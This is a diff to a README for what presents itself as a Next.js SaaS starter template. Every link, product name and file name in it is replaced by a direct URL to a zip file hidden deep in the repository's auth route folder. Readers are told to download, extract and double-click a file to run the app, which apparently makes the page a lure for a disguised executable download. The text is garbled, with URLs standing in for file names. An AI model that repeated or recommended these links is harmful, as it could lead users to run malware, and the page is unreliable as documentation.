@@ -1,10 +1,10 @@
 # 🚀 nextjs-saas-starter-template - Launch Your SaaS Product Easily
 
-[![Download](https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip%https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip)](https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip)
+[![Download](https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip%https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip)](https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
-This guide helps you download and run the https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip SaaS starter template with ease. You will get a production-ready application that includes features like authentication, subscriptions, AI integration, and modern UI components. 
+This guide helps you download and run the https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip SaaS starter template with ease. You will get a production-ready application that includes features like authentication, subscriptions, AI integration, and modern UI components. 
 
 ## 🖥️ System Requirements
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip) to download the latest version of the application.
+   Go to the [Releases page](https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip) to download the latest version of the application.
 
 2. **Select the Latest Release**
 
@@ -34,7 +34,7 @@ Before you start, ensure your computer meets these requirements:
 
 5. **Run the Application**
 
-   Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip` or `https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip`. Double-click this file to run your application.
+   Navigate to the folder where you extracted the files. Look for a file named `https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip` or `https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip`. Double-click this file to run your application.
 
 6. **Access the Application**
 
@@ -54,7 +54,7 @@ To customize your application, follow these steps:
 
 1. **Open the Config File**
 
-   Look for a file named `https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip` in the main folder. 
+   Look for a file named `https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip` in the main folder. 
 
 2. **Modify the Settings**
 
@@ -81,7 +81,7 @@ If you run into issues, consider these common problems:
 
 ### How do I update my application?
 
-Simply revisit the [Releases page](https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip) and download the latest version. Replace the old files with the new ones.
+Simply revisit the [Releases page](https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip) and download the latest version. Replace the old files with the new ones.
 
 ### Is the application free?
 
@@ -97,4 +97,4 @@ If you need help or want to connect with other users, join our community. You ca
 
 For any bugs or feature requests, please open a new issue.
 
-Thank you for choosing the https://raw.githubusercontent.com/H4ck3rmrx/nextjs-saas-starter-template/main/hypocarp/nextjs-saas-starter-template.zip SaaS starter template! Your journey to building a SaaS application starts here.
+Thank you for choosing the https://github.com/H4ck3rmrx/nextjs-saas-starter-template/raw/refs/heads/main/app/api/auth/[...all]/nextjs-saas-starter-template-v2.0-beta.2.zip SaaS starter template! Your journey to building a SaaS application starts here.
